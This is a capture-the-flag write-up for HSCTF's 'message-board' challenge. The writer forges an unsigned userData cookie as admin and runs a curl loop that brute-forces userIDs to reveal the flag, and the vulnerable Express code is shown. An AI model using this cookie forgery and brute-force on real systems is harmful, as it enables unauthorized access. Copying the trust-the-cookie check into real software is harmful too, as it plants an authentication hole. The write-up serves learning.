# message-board (369 solves, 305 points)
## Description
Your employer, LameCompany, has lots of gossip on its company message board: message-board.hsc.tf. You, Kupatergent, are able to access some of the tea, but not all of it! Unsatisfied, you figure that the admin user must have access to ALL of the tea. Your goal is to find the tea you've been missing out on.

Your login credentials: username: ``kupatergent`` password: ``gandal``

Server code is attached (slightly modified).

[message-board-master.zip](https://hsctf.storage.googleapis.com/uploads/5c8d4d1d4114875f51aadb906055d0b4e46a5ef772bdd5fc5bbbfe68b90a3e1f/message-board-master.zip)
## Solution
After visiting the site and logging in with the provided credentials, I started snooping around with the developer console. Soon enough I checked the Cookies in the Application
tab. There is a cookie called ``userData`` that is being used to determine our identity. It's value is ``j%3A%7B%22userID%22%3A%22972%22%2C%22username%22%3A%22kupatergent%22%7D``

It looks to be URL encoded. The decoded version of the cookie is ``j:{"userID":"972","username":"kupatergent"}``. The ``app.js`` file contains the following:
```javascript

const users = [
    {
        userID: "972",
        username: "kupatergent",
        password: "gandal"
    },
    {
        userID: "***",
        username: "admin"
    }
]

app.get("/", (req, res) => {
    const admin = users.find(u => u.username === "admin")
    if(req.cookies && req.cookies.userData && req.cookies.userData.userID) {
        const {userID, username} = req.cookies.userData
        if(req.cookies.userData.userID === admin.userID) res.render("home.ejs", {username: username, flag: process.env.FLAG})
        else res.render("home.ejs", {username: username, flag: "no flag for you"})
    } else {
        res.render("unauth.ejs")
    }
})

```
This shows that the website is checking our ``userData`` cookie for the admin username and userId. If we get it right, we will get the flag. I wrote a bash script that curls
the target url with a session cookie and echos relative portions of the html.

This is the bash script:
```bash

#!/bin/bash
for uid in {0..999}
do
    OUTPUT=$(curl -b userData=j%3A%7B%22userID%22%3A%22$uid%22%2C%22username%22%3A%22admin%22%7D https://message-board.hsc.tf/ | grep -i -C 2 "flag")
    echo "uid: $uid"
    echo "${OUTPUT}"
done

```
I ran ``./getUid.sh > outputOfCurl.txt``. After it was done I could grep the saved file for the flag:
```
$ cat outputOfCurl.txt | grep -i -C 2 flag{                                                                                                              
        <p><strong data-bs-toggle="tooltip" title="a super friendly person :)">Karen:</strong> Technically you're not hearing me.</p>
        <p><strong data-bs-toggle="tooltip" title="has had enough of this bs">Rosa:</strong> Okay, I'm heading out.</p>
        <p><strong data-bs-toggle="tooltip" title="what a cool name">HSCTF:</strong> flag{y4m_y4m_c00k13s}</p>
    </div>
</div>
```
## Flag
``flag{y4m_y4m_c00k13s}``
